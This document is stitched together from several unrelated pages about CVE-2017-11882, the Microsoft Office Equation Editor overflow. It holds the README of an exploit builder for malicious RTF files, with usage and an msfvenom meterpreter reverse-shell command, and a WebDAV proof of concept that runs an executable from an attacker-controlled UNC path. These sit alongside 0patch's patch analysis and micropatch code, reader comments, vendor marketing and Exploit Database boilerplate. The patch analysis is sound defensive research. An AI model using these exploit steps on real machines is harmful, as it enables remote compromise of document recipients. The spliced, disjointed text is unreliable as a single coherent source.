# CVE-2017-11882 Exploit

CVE-2017-11882 Exploit accepts over 17k bytes long command/code in maximum.

For remote command execution,this exploit will call WinExec with SW\_HIDE and call ExitProcess after WinExec returns.

For remote code execution,this exploit just jmp to code.

I cannot find a reference for the object structure...so I cannot change the file length for arbitrary length code execution..:(

But I do think 17k bytes is really enough. Python script will detect the payload size you need and choose the correct payload template.

**Caution: RCE will stuck winword process if you don't migrate to another process!**

Currently this exploit will inject your shellcode to new EQNEDT32.EXE process if you specify **-i** flag. **This operation is suspicious to AV but it won't stuck the word process.**

## Usage

```
usage: CVE-2017-11882.py [-h] -c CMD [-t {0,1}] [-i INJECT] -o OUTPUT

Exploit for CVE-2017-11882 @unamer(https://github.com/unamer/CVE-2017-11882)

optional arguments:
  -h, --help            show this help message and exit
  -c CMD, --cmd CMD     Command or shellcode file to run in target system
                        (Must be shorter than 17967 bytes!!)
  -t {0,1}, --type {0,1}
                        Type (0:shellcode 1:command, default=1)
  -i INJECT, --inject INJECT
                        Inject shellcode to new process
  -o OUTPUT, --output OUTPUT
                        Output exploit rtf

```

Example:

For remote command execution

```
CVE-2017-11882.py -c cmd.exe -o test.rtf

```

For remote code execution

1. Generate some shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=2333 -o ./sc.bin

```

2. Generate exploit

```
CVE-2017-11882.py -c sc.bin -t 0 -i 1 -o test.rtf

```

## Debug

1. Set debugger value to your debugger path in HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EQNEDT32.EXE
2. Build an exploit and run it.
3. Set break point at 0x41165f
4. This break point will be hit twice, at second time the payload will be executed after this function returned.

### Did Microsoft Just Manually Patch Their Equation Editor Executable? Why Yes, Yes They Did. (CVE-2017-11882)

**And They Did an Absolutely Stellar Job**

by Mitja Kolsek, the 0patch Team

[Update 11/21/2017]  Today Embedi published [their proof-of-concept exploit](https://github.com/embedi/CVE-2017-11882), which allowed us to see where exactly Microsoft's manual patch blocks it. Contrary to this article's original claim that CVE-2017-11882 was patched in function 4164FA while six other buffer overflow checks we found were for some other attack vectors, it is actually one of those six checks that blocks Embedi's exploit. This article has been slightly corrected to reflect that. In addition, we were now able to create a micropatch for Equation Editor that also blocks all exploits targeting the vulnerability found by Embedi. All Internet-connected computers with a registered 0patch Agent running have already received this micropatch and have it automatically applied whenever Equation Editor is launched. [End update 11/21/2017]

**A Pretty Old Executable**

The recent Patch Tuesday brought, among other things, a new version of "old" Equation Editor, which introduced a [fix for a buffer overflow issue](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882) reported by [Embedi](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about).

The "old" Equation Editor is an *ancient* component of Microsoft Office (Office now uses an integrated Equation Editor), which is confirmed by looking at the properties of the unpatched EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s640/Equation_editor_properties.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8IEeFXdeDj9mNI75V11tpfyB2wAA0lkkdhh3Gwx3lE_tU7SRLB4tiCfPRAcjLeXftcue_6JyFhzhx2TLjvqdZ2wY7a77Rqb-kXquw2wpc57_luDHGxd3oCcVh2ptiMJwhc6VsJMsbxyw2/s1600/Equation_editor_properties.png)

We can see that *File version* is 2000.11.9.0 (implying being built in 2000), while *Date modified* is in 2003, which matches the time of its signature (signing modifies the file as the signature is attached to it.) Furthermore, the [*TimeDateStamp* in its PE header](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547%28v%3Dvs.85%29.aspx) (3A0ACEBF),
which the compiler writes into the executable module when building it,
indicates that the file was built on November 9, 2000 - exactly matching
the date in the above version number.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s640/Equation_editor_timestamp.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiT-yzvlWZUx42-mAhguywx14XNLDV-UW7wW5AVPEbjyvRed4Hsx6mMeuVcMHDMknQGX7WDHU_RWUDIkm8cq2tCsJKYBv_hOKJqphYLIkd6C6wDnYhCdZb6Utw_ZHKSYWvtCyE1-Ptva3fm/s1600/Equation_editor_timestamp.png)

We're therefore safe to claim that the vulnerable EQNEDT32.EXE has been with us since 2000. That's 17 years, which is a pretty respectable life span for software!

So now a vulnerability was reported in this executable and Microsoft spawned their fixing procedure: they reproduced the issue using Embedi's proof-of-concept, confirmed it, took the source code, fixed the issue in the source code, re-built EQNEDT32.EXE, and distributed the fixed version to Office users, who now see version 2017.8.14.0 under its properties.

At least that's how it *would* work for most other vulnerabilities. But something was different here. For some reason, Microsoft didn't fix this issue in the source code - but rather by manually patching the binary executable.

**Manually Patching an EXE?**

Really, quite literally, some pretty skilled Microsoft employee or contractor reverse engineered our friend EQNEDT32.EXE, located the flawed code, and corrected it by manually overwriting existing instructions with better ones (making sure to only use the space previously occupied by original instructions).

How do we know that? Well, have you ever met a C/C++ compiler that would put all functions in a 500+ KB executable on **exactly the same address in the module** after rebuilding a modified source code, especially when these modifications changed the amount of code in several functions?

To clarify, let's look at BinDiff results between the fixed (2017.8.14.0, "primary") and vulnerable version (2000.11.9.0, "secondary") of EQNEDT32.EXE:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s640/Equation_Editor_diff_matched_functions.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s1600/Equation_Editor_diff_matched_functions.PNG)

If you're diffing binaries a lot, you'll notice something highly peculiar: All *EA primary* values are identical to *EA secondary* values of matched functions. Even the matched but obviously different functions listed at the bottom are at the same address in both EQNEDT32.EXE versions.

As we already [noted on Twitter](https://twitter.com/0patch/status/930803478930345984), Microsoft modified five functions in EQNEDT32.EXE, namely the bottom-most five functions listed on the above image. Let's look at the most-modified one first, the one at address 4164FA. The patched version is on the left, the vulnerable one on the right.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s640/Equation_Editor_diff_patched_function.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0DFJCW0nBXQQbl5RVesEv8yM5C4y6vqJLDXboQr7_SinByDrH8i7A0dq-uhsrjEHUxmnaRgD7ar1gqcUZskbpbnkOHLADbvUWK6fiHtQ4Z3b3Y9_AFWejkevLIK1_ShFFk4Xru5BHv4rb/s1600/Equation_Editor_diff_patched_function.PNG)

This function takes a pointer to the destination buffer and copies characters, one by one in a loop, from user-supplied string to this buffer. It is also the very function that Embedi found to be vulnerable in their research; namely, there was no check whether the destination buffer was large enough for the user-supplied string, and a too-long font name provided through the Equation object could cause a buffer overflow.

Microsoft's fix introduced an additional parameter to this function, specifying the destination buffer length. The original logic of the character-copying loop was then modified so that the loop ends not only when the source string end is reached, but also when the destination buffer length is reached - preventing buffer overflow. In addition, the copied string in the destination buffer is zero-terminated after copying, in case the destination buffer length was reached (which would leave the string unterminated).

Let's look at the code in its text form (again, patched function on left, vulnerable on right):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s640/Patched_function_code_diff.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbwrISsFajRN3RaxX4Ifogd77w010gSKkHjcEc3aVQio1cmoo1FaZk-17WBJ1tlj3CfuKnGcRhLRfA9XnWdrCXq9Rc0sHrMZp5BFIdWaKZvDHyyuMEeEgMClLRS7R67_SK6J2Z32q9bp7C/s1600/Patched_function_code_diff.png)
As you can see, whoever patched this function not only added a check for buffer length in it, but also managed to make the function 14 bytes shorter (and padded the resulting gap before the adjacent function with 0xCC bytes for style points :). Impressive.

**Patching The Callers**

Moving on. If the patched function got an additional parameter, all those calling it would have to change as well, right? There are exactly two callers of this function, at addresses 43B418 and 4181FA, and in the patched version they both have a push instruction added before the call to specify the length of their buffers, 0x100 and 0x1F4 respectively.

Now, a push instruction with a 32-bit literal operand takes 5 bytes. In order to add this instruction to these two functions while staying within the tight space of the original code (whose logic must also remain intact), thepatcher did the following:

For function at address 43B418, the patched function temporarily stores some value - which it will need later on - in ebx instead of a local stack-based variable, which releases enough bytes for injecting the push call. (By the way, additional evidence of manual patching is that while the local variable is no longer used, space for it is still made on the stack; otherwise sub esp, 0x10C would turn into sub esp, 0x108.)

For the other caller, function at address 4181FA, the patched function mysteriously has the push instruction injected without any other modifications to the code that would introduce the needed extra space.

As you can see on the above image, the push instruction is injected at the beginning of the yellow block, and all original instructions in that block are pushed down 5 bytes. But why does this not overwrite 5 bytes of the original code somewhere else? It's as if there were 5 or more unused bytes already in existence just after this block of code that the patcher could safely overwrite.

To solve this mystery, let's look at the code in its text form.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s640/4181FA_code_diff.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEfprSByDLlfoqDcG4K_JeQ7pEcclD2HwPzP60YC-GuNmOG7g7rGZiw6cm4BqCoeBye_z04njU2LmXb9P7AfOSYEKLnXFMC8L3w-Co3W-Pf-c76Q7RaX7B4G0wNsYhbD1A9tiQKbrnc9kz/s1600/4181FA_code_diff.PNG)

Surprise, the vulnerable version actually had an extra jmp loc\_418318 instruction at the end of the modified code block. How convenient! This allows the code in this block to be moved down 5 bytes, making space for the push instruction at the top.

Coincidence? Perhaps, but it looks an awful lot like this code block got manually modified before in the past, whereby it got shortened for 5 bytes and its last instruction (jmp loc\_418318) was left there.

**Additional Security Checks**

What we've covered so far was related to Embedi's published research and CVE-2017-11882, but is *not* what blocks Embedi's exploit. The new version of EQNEDT32.EXE has two additional modified functions at addresses 41160F and 4219F0. Let's have a look at them.

In the patched executable, these two functions got a bunch of injected boundary checks for copying to what appear to be 0x20-byte buffers. These checks all look the same: ecx (which is the counter for copying) is compared to 0x21; if it's greater than or equal to that, ecx gets set to 0x20. All these checks are injected right before inlined memcpy operations. Let's look at one of them to see how the patcher made room for the additional instructions.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s640/Equation_Editor_diff_41160F.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe0z6vud-e8X-qN8MdsAuXQ3tdKEVU6NbGAw-0DjAtqoprFTNriJYQEO1CPN3Wpd7RilpN9K_Oq8K_kIB19Nn4YjD6tcAV9DN4sIn4WpU0nizx4DkVVgHmqZWjqTKI5Z9CtlF4t2lm2ijK/s1600/Equation_Editor_diff_41160F.PNG)

As shown on the above image, a check is injected before the inlined memcpy code. Note that in 32-bit code, memcpy is typically implemented by first copying blocks of 4 bytes using the movsd (move double word) instruction, while any remaining bytes are then copied using movsb (move byte). This is efficient in terms of performance, but whoever was patching this noticed that some space can be freed by only using movsb, and perhaps sacrificing a nanosecond or two. After doing so, the code remained logically identical but now there was space for injecting the check before it, as well as for zero-terminating the copied string. Again, an impressive and clever hack (and there was still an extra byte to spare - notice the nop?)

There are six such length checks in two modified functions, and just one of them is directly responsible for blocking Embedi's exploit. We believe that Microsoft noticed some additional attack vectors that could also cause a buffer overflow and decided to proactively patch the other five memcpys and the patched function we covered earlier.

**Final Touches**

After patching the vulnerable code and effectively manually building a new version of Equation Editor, the patcher also corrected the version number of EQNEDT32.EXE to 2017.8.14.0, and the *TimeDateStamp* in the PE header to August 14, 2017 (hex value 5991FA38) - which is just 10 days after Microsoft acknowledged receipt of Embedi's report. (Note however that due to the manual nature of setting these values it's possible that code has been modified after that date.)

[Update 11/20/2017] Another thing Microsoft also patched in EQNEDT32.EXE was the "ASLR bit", i.e., they set the IMAGE\_DLLCHARACTERISTICS\_DYNAMIC\_BASE flag in the [PE optional header structure](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339%28v%3Dvs.85%29.aspx):

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s640/ASLR.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPg_J8QSSkyHHtChYKp7iqQurszpBIyb-BoKW6_XGIaYw6144v2mT6BSJUvgEWsM3ZhBSIDeZVvsAhSSPLOhXU686BgxoMdx8dhCnTs0VDJhGjwqxHb1jG9zjg_kEdqWqtHjYMHiqYW6DE/s1600/ASLR.png)

This is good. Enabling ASLR on EQNEDT32.EXE will make it harder to exploit any remaining memory corruption vulnerabilities. For instance, Embedi's exploit would not work with ASLR because it relied on the fact that the call to WinExec would always be present at the same memory address; this allowed them to simply put that address on stack and wait for the ret to do all the work.

Interestingly, Microsoft decided not to also set the IMAGE\_DLLCHARACTERISTICS\_NX\_COMPAT ("DEP") flag, which would prevent code execution from data pages (e.g., from stack). They surely had good reasons, but should any additional vulnerabilities be found and exploited in EQNEDT32.EXE, the exploit will likely include execution of data on stack or heap. [End update 11/20/2017]

**Conclusion**

Maintaining a software product in its binary form instead of rebuilding it from modified source code is hard. We can only speculate as to why Microsoft used the binary patching approach, but being binary patchers ourselves we think they did a stellar job.

This old Equation Editor is now under the spotlight, and many researchers are likely to start fuzzing it for additional vulnerabilities. If any are found, we'll probably see additional rounds of manual binary patches in EQNEDT32.EXE. While Office has had a new Equation Editor integrated since at least version 2007, Microsoft can't simply remove EQNEDT32.EXE (the old Equation Editor) from Office as there are probably tons of old documents out there containing equations in this old format, which would then become un-editable.

Now how would we micropatch CVE-2017-11882 with 0patch? It would actually be much easier: we wouldn't have to shrink existing code to make room for the injected one, because 0patch makes sure that we get all the space we need. So we wouldn't have to come up with clever hacks like de-optimizing memcpy or finding an alternative place to temporarily store a value for later use. This freedom and flexibility makes developing an in-memory micropatch much easier and quicker than in-file patching, and we believe software vendors like Microsoft could benefit greatly from using in-memory micropatching for fixing critical vulnerabilities.

Oh by the way, Microsoft also updated Office's wwlib.dll this Patch Tuesday, prompting us to port our [DDE / DDEAUTO patches](https://blog.0patch.com/2017/10/0patching-office-dde-ddeauto.html) to these new versions. 0patch Agent running on your computer will automatically download and apply these new patches without interrupting you. If you don't have 0patch Agent installed yet, we have good news for you: IT'S FREE! Just [download](http://0patch.com/download.htm), install and register, and you're all set.

Cheers!

     This is the most obvious and probably the real reason. 17 year old source code got lost... God knows, maybe they were not even using a source code version control system back then.

     Either this or they know how long their builds take. Maybe a very long time. I think also other files would be touched with a re-compile from source. Throw OEM and alternate language versions in. If more than 100 versions then it's clear why. If it's just 5 or 6 versions maybe different. Surely this saves a recompile on somewhere between 24 and 75 builds of the same software. Saves on bandwidth too, maybe they want to get this out quick and deep = small file gets in quicker.

   Having the patched version on the left has lately become a habit to us (often diffing the latest version with multiple older versions so primary stays open). But wondering, is there some consensus on this in the community?

     I haven't heard of any consensus (or seen the question asked before). I typically do Old Left - New Right so i can see what was present when I started and what changes I've made.
     When doing a merge I'll put my changes on the left with the new file on the right when comparing so the destination is on the right.

     That said: without looking it up I don't know how I diff current vs past revisions. (Verifying it I do have past on left with current would be on right)

     Although it sounds logical to have the newer versions to the right like in a timeline, it's more "natural?" to have the newer on the left and the older on the right :D Dunno, I got a strange feeling about that :D

     ditto the above, it's like reading left to right, like an x-axis timeline increasing from left to right. Seems a reasonable request.

   The copyright tag in the first screenshot is interesting. Who are "Design Science, Inc."? Perhaps that's why Microsoft doesn't have the source?

   Equation Editor was written bu a third party vendor (Design Science). Most probably MS did not have the source code.

     Design Science continued development of this product into their fully featured MathType software

     That's not correct: MathType has been around for a long time: first on the Mac, and then on Windows 2. Microsoft licensed a scaled-down version of MathType, called Equation Editor, for inclusion with some of its products on both Windows and Macintosh.

    And yes the nop [eax+eax] is a 0F 1F NOP that don't work on older CPUs.

    Reported a bug to MS in GDI+ Image.Save() about 2 years ago, which is present from XP to Win10. Some encoders do not report an error if write operations fail (e.g. out of disk space) and generate invalid files. MS offered 3 different approaches, how to work around this problem, but refused to accept this being a bug. I got the impression, that they don't want to touch old code. After a lot of arguing (maybe 10 emails) they finally accepted it being a bug. Maybe they are scared that a rebuild with a current tool chain may cause strange side effects. Maybe the old code base contains "dirty tricks", that would cause issues with current tools.

      I'm pretty sure that a company like Microsoft, does not only keep old sources, but also the relevant tool chains, target OSes (to build and test upon). Otherwise things would be pretty futile and indeed dangerous.

      That doesn't mean, of course, that they are reluctant to change old software - every little change could introduce a compatibility issue on the other end.

    Technically, Microsoft could just have a replicable build toolchain. This is a thing in safety critical computing, where you should be able to recreate binaries bit-for-bit; usually this means version controlling the source code together with the entire toolchain.

    MS had source code (or Design Science compiled it for them) at least as far as around 2005, since different build comes with Office 2007 and file is dated 10/04/2005 (also TimeDateStamp in both builds correspond to file modification date). For whatever reason they reverted to older builds since Office 2010 I think.

    Besides recompilation I see no other differences, version numbers are the same, copyright date is the same etc.

    Discovered that while updating manually Equation Editor on various PCs with different Office versions.

    TL&DR; Office 2007 had different version of Equation Editor built in 2005.

    I was an engineer at Microsoft working on compatibility fixes and did a lot of these patches. You are very often better off making a very specific tweak to older codebases rather than doing a full build. Minor changes to compilers, other tools, etc are an issue, but the big one is recreating the full test suite for older apps. Doing a professional job releasing software that could be in use by millions of people is a HUGE endeavor to do properly.

We are a team of IT security professionals who are driven to revolutionize the industry of smart
devices (IoT, IIoT, and Automotive).

We drastically improve the security of your smart devices. In today’s hyper-connected world, inspiring confidence in security is a rare commodity. Our solutions meet the requirements industry security standards from different governing bodies around the world.

Every smart device in your household is a potential victim to cyber-attacks,
leaving your critical data, personal information, and trade secrets vulnerable. Even leaving an innocent
smart device, such as a smart refrigerator, unprotected can easily enable attackers to target a specific
device, such as your laptop, which is part of a chain of attack. In this hyperconnected world, smart
devices are evolving faster than the pace of security making them highly attractive for attackers to
compromise. Whether you think of yourself as a security expert or novice you are helplessly exposed.

Security of smart devices is the number one priority because without consumer
confidence there would be no smart devices. The implementation of our security solution stands up to the
most rigorous attacks and is so sophisticated that even unknown methods of attacks are defended
against.

Smart devices are no longer abstract devices. Price policy of the IoT world and other advantages, like power consumption and mobility, allow consumers to use these products outside – in fields, streets and any other places, where it couldn’t be used before. Hence, an attacker threatens our everyday lives.

Embedi experts put all their time and effort to revolutionalize IoT, IIoT, and Automotive to give both the sense of security and actual security to the
companies working in these fields of industry.

webdav_exec CVE-2017-11882

A simple PoC for CVE-2017-11882. This exploit triggers WebClient service to start and execute remote file from attacker-controlled WebDav server. The reason why this approach might be handy is a limitation of executed command length. However with help of WebDav it is possible to launch arbitrary attacker-controlled executable on vulnerable machine. This script creates simple document with several OLE objects. These objects exploits CVE-2017-11882, which results in sequential command execution.

The first command which triggers WebClient service start may look like this:

cmd.exe /c start \\attacker_ip\ff
Attacker controlled binary path should be a UNC network path:

\\attacker_ip\ff\1.exe
Usage

webdav_exec_CVE-2017-11882.py -u trigger_unc_path -e executable_unc_path -o output_file_name
Sample exploit for CVE-2017-11882 (starting calc.exe as payload)

example folder holds an .rtf file which exploits CVE-2017-11882 vulnerability and runs calculator in the system.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### Microsoft's Manual Binary Patch For CVE-2017-11882 Meets 0patch

by Luka Treiber, the 0patch Team

Last Monday evening Embedi published the [PoC](https://github.com/embedi/CVE-2017-11882) referred to in their [report](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about) and on Tuesday we released a micropatch for the vulnerability. Here is the analysis.

The PoC is in form of an RTF file that, if opened in Microsoft Word, immediately pops up calc.exe. To accomplish this, Embedi overflowed a string buffer on the stack with an overlong font name applied to an equation text.

As shown in their [WinDbg screenshot](https://embedi.com/files/blog/word/word-11.png), the overlong font name contains a command string to be executed followed by padding A's until a trailing return address to a WinExec call at offset 2Ch that is supposed to execute the command string. Apparently the WinExec call address, located at font string offset that is already out of bounds of the designated buffer, replaces a legitimate return address on stack so when the vulnerable function returns, the payload gets executed instead.

What was Microsoft's official patch? As already said in [our previous post](https://blog.0patch.com/2017/11/did-microsoft-just-manually-patch-their.html), the [diff](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnUHMd534sZyKvY8L5kPC7UfzjLazmo6ywEspdFSJwQHIlvD7R362ECK-OlBECc9OruM0F8UMM1Ov3FEUEONfgx8wG5gWfHOGgJ4ITBLhOcdW6oa3PnmQjKKR9kVRYWwoOFhUS9f6NrXx4/s640/Equation_Editor_diff_matched_functions.PNG) of EqnEdt32.exe between versions 2017.8.14.0 and 2000.11.9.0 showed only 5 modified functions. Running the PoC with WinDbg attached showed that it executes one of the patched functions, sub\_0041160F. There were 5 changed blocks of code in that function, but it turns out the relevant patch that blocks the PoC is the topmost one.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1aVO1dhaPCOOKmGek0vrmyzNX4seQPRFFjLrvnMxXYLZsaTSYLVIqxY6QnG_u0eVBDDfnQ2BlBrIC5qTdKs0Mu4Clmf2y_PK4TH2f-uQM0SdKVJ3s_htjhamv5vss6snN3LliS9mnYfaZ/s640/diff1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1aVO1dhaPCOOKmGek0vrmyzNX4seQPRFFjLrvnMxXYLZsaTSYLVIqxY6QnG_u0eVBDDfnQ2BlBrIC5qTdKs0Mu4Clmf2y_PK4TH2f-uQM0SdKVJ3s_htjhamv5vss6snN3LliS9mnYfaZ/s1600/diff1.png)

This patch consists of an added boundary check (top square on the left) and buffer truncation code (bottom square on the left)  to a vulnerable memcpy operation that overwrote a stack buffer as previously mentioned. The conditional is placed after counting bytes to be copied from arg\_0 to var\_28 and makes sure that if the source string is too long, only 0x20 bytes are copied and zero-terminated.

However, this is not the biggest difference applied to the vulnerable code block. The most code reorganization and, we believe, effort had to be put into the middle square where the developer replaced the compiler's memcpy implementation on the right with a more compressed alternative to gain space for injecting the aforementioned security check.

Based on all these findings we wrote our own micropatch:

; CVE-2017-11882 patch for Equation Editor EQNEDT32.EXE 2000.11.9.0
MODULE\_PATH "C:\Analysis\CVE-2017-11882\EQNEDT32.EXE"
PATCH\_ID 313
PATCH\_FORMAT\_VER 2
VULN\_ID 3084
PLATFORM win32

patchlet\_start
 PATCHLET\_ID 1
 PATCHLET\_TYPE 2
 PATCHLET\_OFFSET 0x0001164C

 code\_start

  cmp     ecx, 21h
  jb      skip
  mov     ecx, 20h
  call PIT\_ExploitBlocked
  skip:

 code\_end

patchlet\_end

patchlet\_start
 PATCHLET\_ID 2
 PATCHLET\_TYPE 2
 PATCHLET\_OFFSET 0x00011661

 code\_start

  xor eax, eax
  stosb ; zero-terminate the string

 code\_end

patchlet\_end

With this micropatch we did the same thing as Microsoft, only we had no hassle finding the space to inject our code. It is quite ingenious how they managed to compress the code around the patch offset in order to make room for the patch code that required additional 10 bytes. We too need space at the patch offset in order to inject a jmp to our micropatch, however, our technology takes care of automatically injecting these 5 bytes and relocating the original code somewhere else. There are certain requirements that the patch location has to meet (see our [0patch Developer Manual](https://0patch.com/dev_manual.htm) for details), but this is far less constraining than compacting code around the offset like Microsoft had to do.

Our micropatches for this vulnerability have been labeled ZP-313 and ZP-314 (there are two slightly different versions of EqnEdt32.exe) and cover all Microsoft Office versions from 2007 to 2016 and 365. As always, if you have 0patch Agent installed, these micropatches should already be present and applied on your system. If not, you can [download a free copy of 0patch Agent](http://0patch.com/download.htm) to protect your system from CVE-2017-11882.

(By the way, ZP-313 and ZP-314 have replaced the now-revoked micropatch for this issue we had released on Tuesday because we wanted to add the zero-termination code and thus fully mirror the official patch. In case you didn't know how micropatch revocation works, it's just as seamless as everything else: the revoked patch simply stops being applied, and the new one starts getting applied instead. Again, users don't notice anything.)

It was a surprising and an interesting revelation that official software vendors/maintainers also occasionally resort to manual binary patching. Moreover, our analysis of the official patch has shown that in such cases it is harder to directly patch the binary than to use in-memory micropatching. Lastly it may even turn out to be infeasible to patch some bugs in binary files because the code may already be fully optimized for space and the technique seen in Microsoft's CVE-2017-11882 patch would require and unacceptable amount of effort. In cases like that micropatching can turn out to be more agile than traditional patching.

This being said, all that remains is the pleasure of presenting a video of our agile micropatch in action :)

## Introduction

What is the beginning of a typical research? Any research begins with detecting vulnerabilities with common tools. Although the process does not require much time and effort, it works well.Detection procedure is focused on vulnerabilities in third-party libraries used in outdated software and widely known to the IT community.

A developer creates different versions of its smart devices using the same third-party and legacy code. It’s a common truth that usually Legacy code is the legacy (excuse tautology) of those distant times when no one followed secure development guidelines. In other words, there is a high probability that its source code has been irrevocably lost, and a binary file is the only thing left. Keeping it in mind the realities of the IoT world, Embedi’s security experts analyzed PC software and chose Microsoft Office, a major office application suite with a long history. The first MS Office version was released 20 years ago. It is being developed in accordance with secure SDL. A dedicated security team tirelessly works on security enhancements for the software product, while throughout its history MS Office proved to be an extremely tempting target for attackers.

### Preparatory stage and methodology

The main question to be answered in this research is: How easy is it to a vulnerability in third-party or legacy code of Microsoft Office and exploit it on the latest Microsoft Windows version? A thorough and precise research requires building attack surface of the Microsoft Office Suite.This attack surface serves as the litmus test to define:

* what elements of the MS Office Suite can be attacked
* what methods a cyber criminal can use to conduct a successful attack
* what modules of the MS Office Suite are responsible for handling formats and different segments of documents.

Also, to detect potential security weaknesses, it is worth to conduct searching for executable modules. The search is intended to identify executable modules with the lowest number of enabled security features protecting against binary vulnerabilities. See the [corresponding Microsoft article](https://web.archive.org/web/20181104111128/https%3A//msdn.microsoft.com/en-us/library/windows/desktop/cc307418.aspx) for more details.

